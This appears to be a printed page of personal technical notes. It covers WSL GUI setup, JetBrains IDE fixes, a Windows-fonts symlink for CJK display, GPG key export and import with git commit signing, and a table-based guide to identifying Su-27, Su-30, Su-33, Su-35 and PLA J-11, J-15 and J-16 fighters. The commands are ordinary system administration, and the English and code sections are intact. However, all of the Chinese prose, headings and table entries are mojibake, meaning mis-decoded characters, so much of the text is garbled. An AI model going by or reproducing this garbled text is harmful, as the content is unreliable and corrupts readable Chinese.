<p>ä¸å‡ºæ„å¤–ä½ å°±èƒ½çœ‹åˆ°ç†Ÿæ‚‰çš„å¼±æ™ºå°çœ¼çƒäº†ã€‚</p>
<p>ä¹Ÿèƒ½æ­£å¸¸ä½¿ç”¨å®‰è£…åœ¨ WSL çš„ Sublime Textã€CLionã€IntelliJ IDEA ç­‰ç­‰ã€‚</p>
<h2 id="jetbrains-ide-çš„è¿›ä¸€æ­¥è°ƒæ•´"><a class="header" href="#jetbrains-ide-çš„è¿›ä¸€æ­¥è°ƒæ•´">JetBrains IDE çš„è¿›ä¸€æ­¥è°ƒæ•´</a></h2>
<p>è£…äº† JB å®¶çš„å‡ ä¸ª IDE ä¹‹åå‘ç°æ²¡æ³•å³å¼€å³ç”¨ï¼Œè¿˜è¦å†é…ç½®ç‚¹ä¸œè¥¿ã€‚</p>
<h3 id="use-windows-default-browser"><a class="header" href="#use-windows-default-browser">Use Windows default browser</a></h3>
<p>WSL æ²¡æœ‰é»˜è®¤æµè§ˆå™¨ï¼ˆå½“ç„¶ï¼‰ï¼Œè€Œ JB å®¶ IDE çš„ markdown æ¸²æŸ“å™¨ä¾èµ– JCEFï¼Œæ‰€ä»¥å¿…é¡»å¾—æœ‰ä¸ªæµè§ˆå™¨ã€‚æˆ‘ä»¬å¯ä»¥ç”¨ Windows çš„æµè§ˆå™¨ï¼š</p>
<p>æ‰“å¼€ <code>Settings &gt; Tools &gt; Web Browsers</code>ï¼Œå°† <code>Default Browser</code> çš„è·¯å¾„æ”¹ä¸º <code>/mnt/c/path/to/your/browser/browser.exe</code> å³å¯ã€‚</p>
<h3 id="resolve-jcef-dependency-issue"><a class="header" href="#resolve-jcef-dependency-issue">Resolve JCEF dependency issue</a></h3>
<p>JCEF ä¾èµ–çš„ <code>libcef.so</code> å’Œ <code>libjcef.so</code> ä¸¤ä¸ªåº“éƒ½æœ‰ä¸€å¤§å †ä¾èµ–ã€‚æ ¹æ® event log çš„æŠ¥é”™å®‰è£…ä¸€ä¸‹å°±å¥½äº†ã€‚æˆ‘ç¼º <code>libXss</code> å’Œ <code>libgbm</code>ï¼š</p>
<pre><code class="language-bash">$ sudo apt install libxss1 libgbm1
</code></pre>
<h2 id="cjk-å­—ä½“æ”¯æ´"><a class="header" href="#cjk-å­—ä½“æ”¯æ´">CJK å­—ä½“æ”¯æ´</a></h2>
<p>å½“ç„¶å¯ä»¥æ‰‹åŠ¨å®‰è£…å­—ä½“ï¼Œä¸è¿‡ä¹Ÿå¯ä»¥åœ¨ <code>/usr/share/fonts/</code> åˆ›å»ºè¿åˆ° Windows å­—ä½“åº“çš„è½¯é“¾æ¥ï¼š</p>
<pre><code class="language-bash">sudo ln -s /mnt/c/Windows/Fonts/ /usr/share/fonts/WindowsFonts
</code></pre>
<p>ç„¶å <code>logout</code> å†ç™»å…¥ï¼Œæˆ–ç”¨ <code>fc-cache</code> æ‰‹åŠ¨ index å­—ä½“åº“ï¼Œå³å¯æ„‰å¿«é˜…è§ˆä¸­æ—¥éŸ©å†…å®¹ã€‚</p>
<pre><code class="language-bash">fc-cache -f -v
</code></pre>
<h2 id="å…¶ä»–-1"><a class="header" href="#å…¶ä»–-1">å…¶ä»–</a></h2>
<p>Windows è®¡åˆ’æ¨å‡º <a href="https://github.com/microsoft/wslg">WSLg</a>ï¼Œä»¥åä¼°è®¡å°±ä¸ç”¨è¿™æ ·äº†ã€‚</p>
<h2 id="reference-3"><a class="header" href="#reference-3">Reference</a></h2>
<ol>
<li><a href="https://linux.vbird.org/linux_basic/centos7/0590xwindow.php">é¸Ÿå“¥çš„ Linux ç§æˆ¿èœï¼šç¬¬äºŒåä¸‰ç« ã€X Window è®¾å®šä»‹ç»</a></li>
<li><a href="https://www.lainme.com/doku.php/blog/2018/07/%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E7%9A%84%E5%9C%A8windows_10%E4%B8%8A%E8%A3%85x">Lainme's Blogï¼šå¦‚ä½•ä¼˜é›…çš„åœ¨ Linux ä¸Šè£… X</a></li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="gpg"><a class="header" href="#gpg">GPG</a></h1>
<h2 id="basics"><a class="header" href="#basics">Basics</a></h2>
<p>List keys</p>
<pre><code class="language-bash">$ gpg --list-secret-keys --keyid-format LONG
path/to/gnupg/pubring.kbx
------------------------------------------------
sec   rsa4096/20732A67E8F95BD9 2020-12-02 [SC]
      4BAE029D16C806BB4FCB925F20732A67E8F95BD9
uid                 Mischa &quot;Matchy&quot; Volynskaya
ssb   rsa4096/DABE372E78DCA377 2020-12-02 [E]
</code></pre>
<p>Export keys</p>
<pre><code class="language-bash">$ gpg --export-secret-keys -a --output secretkey
</code></pre>
<p>Import keys (from the secretkey generated)</p>
<pre><code class="language-bash">gpg --import secretkey
</code></pre>
<h2 id="git-gpg-sign"><a class="header" href="#git-gpg-sign"><code>git</code> gpg sign</a></h2>
<h3 id="basics-1"><a class="header" href="#basics-1">Basics</a></h3>
<p>Config signing key</p>
<pre><code class="language-bash">git config --global user.signingkey &lt;key id&gt;
</code></pre>
<blockquote>
<p>On (hopefully most) Linux distro the <code>&lt;key id&gt;</code> can be tab-completed. Unfortunately not possible for Windows PowerShell :(</p>
</blockquote>
<p>Sign a single commit</p>
<pre><code class="language-bash">git commit -S -m &quot;commit message&quot;
</code></pre>
<p>Always sign</p>
<pre><code class="language-bash">git config --global commit.gpgsign true
</code></pre>
<h3 id="trouble-shooting"><a class="header" href="#trouble-shooting">Trouble shooting</a></h3>
<p>If you receive errors like <code>secrete key not available</code> or <code>no secret key</code> (one example shown below), it is possible that the <code>gpg</code> program used by your <code>git</code> is different from your system's default <code>gpg</code>. Thus, the secret key was only imported to the system <code>gpg</code>, but is still unknown to <code>git</code>'s <code>gpg</code>.</p>
<pre><code class="language-shell">$ git commit -m &quot;Test&quot;
gpg: skipped &quot;&lt;key id&gt;&quot;: No secret key
gpg: signing failed: No secret key
error: gpg failed to sign the data
fatal: failed to write commit object
</code></pre>
<p>To solve this issue, we need to configure <code>git</code>'s <code>gpg</code> program to that with your secret key imported.</p>
<p>Run <code>which gpg</code> (*nix shells) or <code>Get-Command gpg</code> (<code>PowerShell</code>) to find that path to your system default gpg program.</p>
<pre><code class="language-bash">$ which gpg
/usr/bin/gpg2
</code></pre>
<pre><code class="language-powershell">$ Get-Command gpg

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Application     gpg.exe                                            2.3.4.6... C:\Program Files (x86)\gnupg\bin\gpg.exe
</code></pre>
<p>Configure <code>git</code> to use the output (*nix shell) or the path listed in column <code>Source</code> (<code>Powershell</code>)</p>
<pre><code class="language-bash">git config --global gpg.program &quot;C:\Program Files (x86)\gnupg\bin\gpg.exe&quot;
</code></pre>
<p>Alternatively, you can run this one-liner</p>
<pre><code class="language-bash">git config --global gpg.program &quot;$(which gpg)&quot;
</code></pre>
<pre><code class="language-powershell">git config --global gpg.program (Get-Command gpg).Source
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ä¾§å«å­¦101"><a class="header" href="#ä¾§å«å­¦101">ä¾§å«å­¦101</a></h1>
<style>
table {
    table-layout: fixed;
    width: 150%;
    cellpadding: 0;
    cellspacing: 0;
}
td {
    word-wrap: break-word;
    text-align: center;
}
td.nobreak {
    padding: 3px 1px!important;
    font-weight: bold;
    white-space: nowrap;
}
td.yes {
    background-color: #ffa535;
}
</style>
<p>çœ‹å®Œè¿™ä¸€ç¯‡ä½ ä¹Ÿèƒ½æˆä¸ºä¾§å«å¤§å¸ˆã€‚</p>
<h2 id="åˆ†ç±»ç‰¹å¾æ•´ç†"><a class="header" href="#åˆ†ç±»ç‰¹å¾æ•´ç†">åˆ†ç±»ç‰¹å¾æ•´ç†</a></h2>
<h3 id="åŸºæœ¬ç±»å‹ä¾§å«--ä¿„ç³»ä¾§å«"><a class="header" href="#åŸºæœ¬ç±»å‹ä¾§å«--ä¿„ç³»ä¾§å«">åŸºæœ¬ç±»å‹ä¾§å« â€”â€” ä¿„ç³»ä¾§å«</a></h3>
<table><thead><tr><th></th><th>åº§ä½</th><th>åº§èˆ±åˆ†ç•Œ</th><th>å‚å°¾</th><th>èµ·è½æ¶</th><th>ç©ºä¸­åŠ æ²¹</th><th>IRST</th><th>ç©ºé€Ÿç®¡</th><th>æ°”åŠ¨å¸ƒå±€</th><th>å…¶ä»–</th><th>å¤‡æ³¨</th></tr></thead><tbody>
<tr><td>Su-27</td><td>å•åº§</td><td>åº§èˆ±æœºèº«<br>æ˜æ˜¾åˆ†ç•Œ</td><td>å‚å°¾åˆ‡å°–</td><td><strong>å‰è½®å•è½®</strong></td><td><strong>æ— ç©ºä¸­åŠ æ²¹æ¥å£</strong></td><td><strong>å±…ä¸­</strong></td><td>æœ‰æœºé¦–ç©ºé€Ÿç®¡</td><td>æ™®é€šç¿¼èº«èåˆï¼Œæ— é¸­ç¿¼</td><td>åº§èˆ±åæœ‰çªèµ·å¤©çº¿</td><td></td></tr>
<tr><td>Su-27UB</td><td><strong>åŒåº§</strong></td><td>åº§èˆ±æœºèº«<br><strong>å¹³æ»‘è¿‡æ¸¡</strong></td><td>å‚å°¾åˆ‡å°–</td><td><strong>å‰è½®å•è½®</strong></td><td><strong>æ— ç©ºä¸­åŠ æ²¹æ¥å£</strong></td><td><strong>å±…ä¸­</strong></td><td>æœ‰æœºé¦–ç©ºé€Ÿç®¡</td><td>æ™®é€šç¿¼èº«èåˆï¼Œæ— é¸­ç¿¼</td><td>åº§èˆ±åæœ‰çªèµ·å¤©çº¿</td><td>æ•™ç»ƒæœº</td></tr>
<tr><td>Su-30</td><td><strong>åŒåº§</strong></td><td>åº§èˆ±æœºèº«<br><strong>å¹³æ»‘è¿‡æ¸¡</strong></td><td>å‚å°¾<strong>å¹³è¡Œ</strong></td><td>å‰è½®åŒè½®</td><td>æœ‰ç©ºä¸­åŠ æ²¹æ¥å£</td><td>ä¾§å</td><td>æœ‰æœºé¦–ç©ºé€Ÿç®¡</td><td>æ™®é€šç¿¼èº«èåˆï¼Œæ— é¸­ç¿¼</td><td></td><td>Su-30MKKã€Su-30MK2 ä¹Ÿæ˜¯è¿™ä¸ªåŸºæœ¬æ„å‹</td></tr>
<tr><td>Su-30SM</td><td><strong>åŒåº§</strong></td><td>åº§èˆ±æœºèº«<br><strong>å¹³æ»‘è¿‡æ¸¡</strong></td><td>å‚å°¾åˆ‡å°–</td><td>å‰è½®åŒè½®</td><td>æœ‰ç©ºä¸­åŠ æ²¹æ¥å£</td><td>ä¾§å</td><td>æœ‰æœºé¦–ç©ºé€Ÿç®¡</td><td><strong>æœ‰é¸­ç¿¼</strong></td><td></td><td>å‡ºå£å°åº¦ã€é©¬æ¥è¥¿äºšå’Œé˜¿å°”åŠåˆ©äºšçš„ Su-30MKI/M/A ä¹Ÿæ˜¯è¿™ä¸ªåŸºæœ¬æ„å‹</td></tr>
<tr><td>Su-33</td><td>å•åº§</td><td>åº§èˆ±æœºèº«<br>æ˜æ˜¾åˆ†ç•Œ</td><td>å‚å°¾ä»‹äº<br>åˆ‡å°–å’Œå¹³<br>è¡Œä¹‹é—´</td><td>å‰è½®åŒè½®</td><td>æœ‰ç©ºä¸­åŠ æ²¹æ¥å£</td><td>ä¾§å</td><td>æœ‰æœºé¦–ç©ºé€Ÿç®¡</td><td><strong>æœ‰é¸­ç¿¼</strong></td><td></td><td></td></tr>
<tr><td>Su-35</td><td>å•åº§</td><td>åº§èˆ±æœºèº«<br>æ˜æ˜¾åˆ†ç•Œ</td><td>å‚å°¾åˆ‡å°–</td><td>å‰è½®åŒè½®</td><td>æœ‰ç©ºä¸­åŠ æ²¹æ¥å£</td><td>ä¾§å</td><td>æ²¡æœ‰æœºé¦–ç©ºé€Ÿç®¡</td><td>æ™®é€šç¿¼èº«èåˆï¼Œæ— é¸­ç¿¼</td><td>é›·è¾¾ç½©åæ–¹æœ‰ 4 ä¸ªå°å‹ L å‹ç©ºé€Ÿç®¡</td><td>æ—©æœŸéªŒè¯æœºå…¶å®æœ‰é¸­ç¿¼</td></tr>
</tbody></table>
<h3 id="è§£æ”¾å†›ç‰ˆä¾§å«"><a class="header" href="#è§£æ”¾å†›ç‰ˆä¾§å«">è§£æ”¾å†›ç‰ˆä¾§å«</a></h3>
<p>é¦–å…ˆï¼ŒJ-11 å®Œå…¨ç­‰åŒäº Su-27ï¼ŒJ-15 æ¨¡ä»¿çš„æ˜¯ Su-33ï¼ŒJ-16 æ¨¡ä»¿çš„æ˜¯ Su-30ï¼Œæ‰€ä»¥å¯ä»¥æŒ‰ç…§åˆ¤æ–­ Su-27ã€Su-30ã€Su-33 çš„æ–¹æ³•å¤§è‡´æŠŠçœ‹åˆ°çš„ PLA é£æœºå½’ç±»ã€‚ä½†è¿›ä¸€æ­¥åˆ¤æ–­æ”¹å‹åˆ™éœ€è¦ç»“åˆæ¶‚è£…ã€é›·è¾¾ç½©ã€ç¿¼å°–æŒ‚æ¶ç­‰ç­‰æ¥å…·ä½“åˆ¤æ–­ã€‚</p>
<p>PLAAF ä¹Ÿä¹°äº†ä¸€äº›ä¿„æ–¹äº¤ä»˜çš„ Su-27ã€Su-30 å’Œ Su-35ï¼Œå’Œæ­¼ç³»ï¼ˆå³ä½¿æ˜¯ç»„è£…çš„ J-11Aï¼‰çš„æœ€å¤§åŒºåˆ«å°±æ˜¯æ²¡æœ‰ç¼–é˜Ÿç¯ã€‚åœ¨æ­¤ä¸€å¹¶åˆ—å‡ºã€‚</p>
<p>PLA çš„æµ·å†›é£æœºéƒ½æ˜¯åç™½çš„ï¼Œç©ºæµ·å†›å…±æœ‰çš„é£æœºçš„æµ·å†›æœºç§åé¢ä¼šå¸¦ Hï¼ˆå¦‚ J-11BHï¼‰ï¼Œåœ¨æ­¤ä¸åšåŒºåˆ†ã€‚ï¼ˆP.S. H for Haijunï¼Œå“ˆå“ˆå“ˆå“ˆï¼‰</p>
<table><thead><tr><th></th><th style="text-align: center">åŸºæœ¬å‹</th><th style="text-align: center">é›·è¾¾ç½©</th><th style="text-align: center">å¤‡æ³¨</th></tr></thead><tbody>
<tr><td>Su-27SK</td><td style="text-align: center">Su-27</td><td style="text-align: center">é›·è¾¾ç½©<strong>æœ‰ç¼ºå£</strong>ä¸”<strong>æœ‰ç¼–å·</strong></td><td style="text-align: center">æ²¡æœ‰ç¼–é˜Ÿç¯</td></tr>
<tr><td>Su-27UBK</td><td style="text-align: center">Su-27UB</td><td style="text-align: center">é›·è¾¾ç½©<strong>æœ‰ç¼ºå£</strong>ä¸”<strong>æœ‰ç¼–å·</strong></td><td style="text-align: center">æ²¡æœ‰ç¼–é˜Ÿç¯<br>æ•™ç»ƒæœºï¼ŒåŒåº§çš„</td></tr>
<tr><td>J-11A</td><td style="text-align: center">Su-27</td><td style="text-align: center">é›·è¾¾ç½©<strong>æœ‰ç¼ºå£</strong></td><td style="text-align: center"></td></tr>
<tr><td>J-11B</td><td style="text-align: center">Su-27</td><td style="text-align: center">é»‘è‰²é›·è¾¾ç½©</td><td style="text-align: center"></td></tr>
<tr><td>J-11BS</td><td style="text-align: center">Su-27UB</td><td style="text-align: center">é»‘è‰²é›·è¾¾ç½©</td><td style="text-align: center">æ•™ç»ƒæœºï¼ŒåŒåº§çš„</td></tr>
<tr><td>J-15</td><td style="text-align: center">Su-33</td><td style="text-align: center">ç°è‰²é›·è¾¾ç½©</td><td style="text-align: center"></td></tr>
<tr><td>J-16</td><td style="text-align: center">Su-30</td><td style="text-align: center">ç°è‰²é›·è¾¾ç½©</td><td style="text-align: center"></td></tr>
</tbody></table>
<h2 id="åŸºæœ¬å‹ä¾§å«ç‰¹å¾æŸ¥è¡¨"><a class="header" href="#åŸºæœ¬å‹ä¾§å«ç‰¹å¾æŸ¥è¡¨">åŸºæœ¬å‹ä¾§å«ç‰¹å¾æŸ¥è¡¨</a></h2>
<table >
<thead>
  <td class="nobreak"></td>
  <td>å•åº§</td>
  <td>åŒåº§</td>
<td>åº§èˆ±æœºèº«æ˜æ˜¾åˆ†ç•Œ</td>
  <td>åº§èˆ±æœºèº«å¹³æ»‘è¿‡æ¸¡</td>
<td>å‚å°¾ä¸åˆ‡å°–</td>
  <td>å‚å°¾åˆ‡å°–</td>
<td>å•å‰è½®</td>
  <td>åŒå‰è½®</td>
<td>IRSTå±…ä¸­</td>
  <td>IRSTåå·¦</td>
<td>æœ‰ç©ºä¸­åŠ æ²¹æ¥å£</td>
  <td>æ— ç©ºä¸­åŠ æ²¹æ¥å£</td>
<td>æ— é¸­ç¿¼</td>
  <td>æœ‰é¸­ç¿¼</td>
</thead>
<tr>
  <td class="nobreak"> Su-27 </td>
  <!-- åº§ä½æ•°ç›® -->
  <td class="yes"></td>
  <td></td>
<!-- åº§èˆ±è¿‡æ¸¡ -->
<td class="yes"></td>
  <td></td>
<!-- å‚å°¾å½¢çŠ¶ -->
<td></td>
  <td class="yes"></td>
<!-- èµ·è½æ¶è½® -->
<td class="yes"></td>
  <td></td>
<!-- åˆ¶å¯¼ä½ç½® -->
<td class="yes"></td>
  <td></td>
<!-- åŠ æ²¹æ¥å£ -->
<td></td>
  <td class="yes"></td>
<!-- æ°”åŠ¨å¸ƒå±€ -->
<td class="yes"></td>
  <td></td>
</tr>
<tr>
  <td class="nobreak"> Su-27UB </td>
  <!-- åº§ä½æ•°ç›® -->
  <td></td>
  <td class="yes"></td>
<!-- åº§èˆ±è¿‡æ¸¡ -->
<td></td>
  <td class="yes"></td>
<!-- å‚å°¾å½¢çŠ¶ -->
<td></td>
  <td class="yes"></td>
<!-- èµ·è½æ¶è½® -->
<td class="yes"></td>
  <td></td>
<!-- åˆ¶å¯¼ä½ç½® -->
<td class="yes"></td>
  <td></td>
<!-- åŠ æ²¹æ¥å£ -->
<td></td>
  <td class="yes"></td>
<!-- æ°”åŠ¨å¸ƒå±€ -->
<td class="yes"></td>
  <td></td>
</tr>
<tr>
  <td class="nobreak"> Su-30MK </td>
  <!-- åº§ä½æ•°ç›® -->
  <td></td>
  <td class="yes"></td>
<!-- åº§èˆ±è¿‡æ¸¡ -->
<td></td>
  <td class="yes"></td>
<!-- å‚å°¾å½¢çŠ¶ -->
<td class="yes"></td>
  <td></td>
<!-- èµ·è½æ¶è½® -->
<td></td>
  <td class="yes"></td>
<!-- åˆ¶å¯¼ä½ç½® -->
<td></td>
  <td class="yes"></td>
<!-- åŠ æ²¹æ¥å£ -->
<td class="yes"></td>
  <td></td>
<!-- æ°”åŠ¨å¸ƒå±€ -->
<td class="yes"></td>
  <td></td>
</tr>
<tr>
  <td class="nobreak"> Su-30SM </td>
  <!-- åº§ä½æ•°ç›® -->
  <td></td>
  <td class="yes"></td>
<!-- åº§èˆ±è¿‡æ¸¡ -->
<td></td>
  <td class="yes"></td>
<!-- å‚å°¾å½¢çŠ¶ -->
<td></td>
  <td class="yes"></td>
<!-- èµ·è½æ¶è½® -->
<td></td>
  <td class="yes"></td>
<!-- åˆ¶å¯¼ä½ç½® -->
<td></td>
  <td class="yes"></td>
<!-- åŠ æ²¹æ¥å£ -->
<td class="yes"></td>
  <td></td>
<!-- æ°”åŠ¨å¸ƒå±€ -->
<td></td>
  <td class="yes"></td>
</tr>
<tr>
  <td class="nobreak"> Su-33 </td>
  <!-- åº§ä½æ•°ç›® -->
  <td class="yes"></td>
  <td></td>
<!-- åº§èˆ±è¿‡æ¸¡ -->
<td class="yes"></td>
  <td></td>
<!-- å‚å°¾å½¢çŠ¶ -->
<td></td>
  <td class="yes"></td>
<!-- èµ·è½æ¶è½® -->
<td></td>
  <td class="yes"></td>
<!-- åˆ¶å¯¼ä½ç½® -->
<td></td>
  <td class="yes"></td>
<!-- åŠ æ²¹æ¥å£ -->
<td class="yes"></td>
  <td></td>
<!-- æ°”åŠ¨å¸ƒå±€ -->
<td></td>
  <td class="yes"></td>
</tr>
<tr>
  <td class="nobreak"> Su-35 </td>
  <!-- åº§ä½æ•°ç›® -->
  <td class="yes"></td>
  <td></td>
<!-- åº§èˆ±è¿‡æ¸¡ -->
<td class="yes"></td>
  <td></td>
<!-- å‚å°¾å½¢çŠ¶ -->
<td></td>
  <td class="yes"></td>
<!-- èµ·è½æ¶è½® -->
<td></td>
  <td class="yes"></td>
<!-- åˆ¶å¯¼ä½ç½® -->
<td></td>
  <td class="yes"></td>
<!-- åŠ æ²¹æ¥å£ -->
<td class="yes"></td>
  <td></td>
<!-- æ°”åŠ¨å¸ƒå±€ -->
<td class="yes"></td>
  <td></td>
</tr>
</table>
<h2 id="åè¯è§£é‡Š"><a class="header" href="#åè¯è§£é‡Š">åè¯è§£é‡Š</a></h2>
<ul>
<li><code>IRST</code>ï¼šå…¨ç§° <strong>I</strong>nfra-<strong>R</strong>ed <strong>S</strong>earch and <strong>T</strong>rackï¼Œçº¢å¤–è·Ÿè¸ªä¸æœç´¢æŠ€æœ¯ã€‚èƒ½å¤Ÿæ¢æµ‹ç›®æ ‡å’Œç©ºä¸­èƒŒæ™¯çš„æ¸©å·®è¿›è¡Œçº¢å¤–æˆåƒï¼Œå’Œè¢«åŠ¨é›·è¾¾ç±»ä¼¼ï¼Œæ‰€ä»¥ä¹Ÿè¢«ç§°ä¸ºçº¢å¤–é›·è¾¾ã€‚</li>
</ul>
<h2 id="å‚è€ƒ"><a class="header" href="#å‚è€ƒ">å‚è€ƒ</a></h2>
<ol>
<li><a href="https://www.zhihu.com/question/316210887/answer/640770443">å¦‚ä½•åŒºåˆ†ä¸€ä¼—è‹å’Œæ­¼ï¼Ÿ - kagoå˜‰è¯­çš„å›ç­” - çŸ¥ä¹</a></li>
</ol>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        <script type="text/javascript">
        window.addEventListener('load', function() {
            MathJax.Hub.Register.StartupHook('End', function() {
                window.setTimeout(window.print, 100);
            });
        });
        </script>
    </body>
</html>
